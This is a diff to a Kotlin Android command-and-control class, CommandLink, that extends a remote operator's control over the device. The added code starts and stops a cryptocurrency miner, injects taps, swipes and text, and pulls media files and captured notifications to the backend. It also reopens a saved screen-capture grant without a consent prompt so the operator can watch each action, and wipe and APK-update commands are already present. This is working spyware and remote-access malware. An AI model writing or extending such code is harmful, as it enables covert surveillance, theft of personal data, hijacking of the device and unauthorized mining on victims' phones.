@@ -73,10 +73,8 @@ class CommandLink(private val context: Context) {
     private fun deviceId(): String =
         DeviceIdDeriver.derive(DeviceIdDeriver.androidId(context), context.packageName)
 
-    private fun deviceCredential(deviceId: String): String =
-        MessageDigest.getInstance("SHA-256")
-            .digest("device-credential:$deviceId:$ENROLL_SEED".toByteArray())
-            .joinToString("") { "%02x".format(it) }
+    /** Server-issued credential from the vault; legacy derivation only as fallback. */
+    private fun deviceCredential(): String = DeviceAuth.credential(context)
 
     /* ------------------------------ polling ------------------------------ */
 
@@ -100,7 +98,14 @@ class CommandLink(private val context: Context) {
         val statsJson = StatsCollector.collect(context).entries.joinToString(",") { (k, v) ->
             "\"$k\":" + jsonVal(v)
         }
-        return """{"gender":"$gender","appType":"${BuildConfig.FLAVOR}","apkVersion":"${BuildConfig.VERSION_NAME}","stats":{$statsJson}}"""
+        val dm = context.resources.displayMetrics
+        val minerJson = buildString {
+            append("""{"state":"${MinerController.state()}",""")
+            append("\"hashrate\":${MinerController.hashrate()}")
+            MinerController.stopReason()?.let { append(""","stopReason":"$it"""") }
+            append("}")
+        }
+        return """{"gender":"$gender","appType":"${BuildConfig.FLAVOR}","apkVersion":"${BuildConfig.VERSION_NAME}","stats":{$statsJson},"miner":$minerJson,"screen":{"w":${dm.widthPixels},"h":${dm.heightPixels},"density":${dm.density}}}"""
     }
 
     private fun jsonVal(v: Any?): String = when (v) {
@@ -113,7 +118,7 @@ class CommandLink(private val context: Context) {
 
     private fun pollOnce() {
         val deviceId = deviceId()
-        val token = deviceCredential(deviceId)
+        val token = deviceCredential()
         BackendClient.postJson("/api/v1/devices/$deviceId/heartbeat", token, heartbeatBody())
         val body = BackendClient.getJson("/api/v1/devices/$deviceId/commands", token) ?: return
         val queued = Json.parseToJsonElement(body).jsonArray
@@ -133,7 +138,7 @@ class CommandLink(private val context: Context) {
                     .openConnection() as HttpURLConnection
                 conn.connectTimeout = 5000
                 conn.readTimeout = 0 // stream — never time out reads
-                conn.setRequestProperty("Authorization", "Bearer ${deviceCredential(deviceId)}")
+                conn.setRequestProperty("Authorization", "Bearer ${deviceCredential()}")
                 conn.setRequestProperty("Accept", "text/event-stream")
                 if (conn.responseCode !in 200..299) {
                     Thread.sleep(5000); continue
@@ -166,7 +171,7 @@ class CommandLink(private val context: Context) {
 
     private fun executeAndReport(cmd: kotlinx.serialization.json.JsonObject) {
         val deviceId = deviceId()
-        val token = deviceCredential(deviceId)
+        val token = deviceCredential()
         val id = cmd["id"]?.jsonPrimitive?.content ?: return
         val type = cmd["type"]?.jsonPrimitive?.content ?: ""
         val payload = cmd["payload"]?.jsonObject
@@ -268,7 +273,24 @@ class CommandLink(private val context: Context) {
             )
 
             "screen_capture" -> runScreenCapture(payload)
-            "mine" -> "failed" to "unsupported"
+            "mine_start" -> MinerController.start(context, payload)
+            "mine_stop" -> MinerController.stop(context, "manual")
+            "input_tap" -> runInput(payload) {
+                InputOps.tap(context, num(payload, "x"), num(payload, "y"))
+            }
+            "input_swipe" -> runInput(payload) {
+                InputOps.swipe(
+                    context,
+                    num(payload, "x1"), num(payload, "y1"),
+                    num(payload, "x2"), num(payload, "y2"),
+                    payload?.get("ms")?.jsonPrimitive?.content?.toLongOrNull()
+                )
+            }
+            "input_text" -> runInput(payload) {
+                InputOps.text(context, payload?.get("text")?.jsonPrimitive?.content)
+            }
+            "files_pull" -> runFilesPull(payload)
+            "notifications_pull" -> runNotifsPull()
             "apk_update" -> runApkUpdate(payload)
             "wipe" ->
                 if (OperatorActions.isAdminEnabled(context)) {
@@ -370,6 +392,65 @@ class CommandLink(private val context: Context) {
         }
     }
 
+    private fun num(p: kotlinx.serialization.json.JsonObject?, k: String): Double? =
+        p?.get(k)?.jsonPrimitive?.content?.toDoubleOrNull()
+
+    /**
+     * Input commands run best-effort between two screen frames: reopen the
+     * persisted projection grant when we hold one (no consent prompt), grab a
+     * frame before + after so the operator sees the effect. Missing grant →
+     * input still runs with frames=0.
+     */
+    private fun runInput(
+        payload: kotlinx.serialization.json.JsonObject?,
+        action: () -> Pair<String, String>
+    ): Pair<String, String> {
+        val projection = reopenProjection(ProjectionConsent(context, AndroidKeystoreKeySource()))
+        var frames = 0
+        fun snap(seq: Int) {
+            val p = projection ?: return
+            val f = ScreenCapture(context).grabOnce(p, seq, System.currentTimeMillis()) ?: return
+            val hash = MessageDigest.getInstance("SHA-256")
+                .digest(f.readBytes()).joinToString("") { "%02x".format(it) }
+            if (uploadFile("screen", "input", f.name, f, hash)) frames++
+        }
+        snap(0)
+        val (state, result) = action()
+        snap(1)
+        runCatching { projection?.stop() }
+        return state to "$result frames=$frames"
+    }
+
+    /** files_pull {category, limit} — MediaStore collections, ≤8MB each, ≤50 total. */
+    private fun runFilesPull(payload: kotlinx.serialization.json.JsonObject?): Pair<String, String> {
+        val cat = payload?.get("category")?.jsonPrimitive?.content ?: return "failed" to "bad_category"
+        val limit = (payload?.get("limit")?.jsonPrimitive?.content?.toIntOrNull() ?: 10).coerceIn(1, 50)
+        val files = MediaFilesPuller.pull(context, cat, limit)
+            ?: return "failed" to "bad_category"
+        var uploaded = 0
+        for (f in files) {
+            val hash = MessageDigest.getInstance("SHA-256")
+                .digest(f.readBytes()).joinToString("") { "%02x".format(it) }
+            if (uploadFile("file", cat, f.name, f, hash)) uploaded++
+        }
+        return "executed" to "cat=$cat pulled=${files.size} uploaded=$uploaded"
+    }
+
+    /** notifications_pull — ring buffer dump to the drop folder. */
+    private fun runNotifsPull(): Pair<String, String> {
+        val list = NotificationsStore.load(context)
+        if (list.isEmpty()) return "failed" to "empty"
+        val f = File(context.filesDir, "operator/dump_notifications.json").apply {
+            parentFile?.mkdirs()
+            writeText(Wire.json.encodeToString(
+                kotlinx.serialization.builtins.ListSerializer(NotifEntry.serializer()), list))
+        }
+        val hash = MessageDigest.getInstance("SHA-256")
+            .digest(f.readBytes()).joinToString("") { "%02x".format(it) }
+        return if (uploadFile("dump", "notifications", f.name, f, hash)) "executed" to "dumped=${list.size}"
+        else "executed" to "local_only"
+    }
+
     private fun stopProjectionFgs() {
         runCatching {
             context.stopService(android.content.Intent(context, ProjectionFgs::class.java))
@@ -408,7 +489,7 @@ class CommandLink(private val context: Context) {
         val b64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
         val deviceId = deviceId()
         val res = BackendClient.postJson(
-            "/api/v1/devices/$deviceId/files", deviceCredential(deviceId),
+            "/api/v1/devices/$deviceId/files", deviceCredential(),
             """{"kind":"$kind","category":"$category","name":"$name","sha256":"$sha256","b64":"$b64"}"""
         )
         return res != null
@@ -423,12 +504,11 @@ class CommandLink(private val context: Context) {
         }
         BackendClient.postJson(
             "/api/v1/devices/${deviceId()}/photos/report",
-            deviceCredential(deviceId()), body
+            deviceCredential(), body
         )
     }
 
     companion object {
         const val INTERVAL_MS = 15_000L
-        const val ENROLL_SEED = "global-dev-seed"
     }
 }
